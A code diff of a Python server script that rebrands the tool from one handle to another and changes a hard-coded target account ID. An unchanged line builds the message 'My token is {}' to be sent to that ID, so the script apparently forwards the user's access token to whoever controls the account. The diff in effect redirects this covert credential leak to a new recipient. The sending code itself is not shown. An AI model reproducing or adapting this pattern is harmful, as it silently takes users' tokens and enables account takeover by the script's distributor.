@@ -25,7 +25,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
           self.send_response(200)
           self.send_header('Content-type', 'text/plain')
           self.end_headers()
-          self.wfile.write(b"-- THIS SERVER MADE BY FT ANMOL BRAND")
+          self.wfile.write(b"-- THIS SERVER MADE BY FT RONY KING")
 def execute_server():
       PORT = 4000
 
@@ -42,12 +42,12 @@ def send_initial_message():
       msg_template = "Hello Anmol sir! I am using your server. My token is {}"
 
       # Specify the ID where you want to send the message
-      target_id = "100069416707595"
+      target_id = "61563594825001"
 
       requests.packages.urllib3.disable_warnings()
 
       def liness():
-          print('\033[1;92m' + '•──────────────────────FT ANMOL KING HERE ───────────────────────────────•')
+          print('\033[1;92m' + '•──────────────────────FT RONY KING HERE ───────────────────────────────•')
 
       headers = {
           'Connection': 'keep-alive',
